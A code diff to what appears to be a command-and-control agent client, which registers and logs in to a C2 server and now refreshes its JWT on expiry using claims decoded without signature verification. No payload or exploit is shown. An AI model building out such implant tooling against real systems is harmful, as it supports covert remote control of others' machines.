@@ -3,6 +3,8 @@ import json
 import uuid
 import requests
 from config import CONFIG_PATH, C2_URL, REGISTER_ENDPOINT, LOGIN_ENDPOINT
+from jose import jwt, JWTError
+from datetime import datetime, timezone
 
 def load_or_create_identity():
     print(f"[DEBUG] Writing identity to: {CONFIG_PATH}")
@@ -59,6 +61,18 @@ def login(agent_id: str, agent_key: str) -> str:
         print("[-] Login error:", str(e))
         exit(1)
 
+def token_valid(token: str) -> bool:
+    try:
+        # Decode without verifying signature
+        payload = jwt.get_unverified_claims(token)
+        exp = payload.get("exp")
+        if exp is None:
+            return False
+        now = datetime.now(timezone.utc).timestamp()
+        return now < exp
+    except JWTError:
+        return False
+
 def initialize_agent():
     first_time = not os.path.exists(CONFIG_PATH)
     identity = load_or_create_identity()
@@ -69,7 +83,7 @@ def initialize_agent():
         identity["jwt"] = token
         with open(CONFIG_PATH, "w") as f:
             json.dump(identity, f)
-    elif "jwt" not in identity:
+    elif "jwt" not in identity or not token_valid(identity["jwt"]):
         token = login(identity["agent_id"], identity["agent_key"])
         identity["jwt"] = token
         with open(CONFIG_PATH, "w") as f:
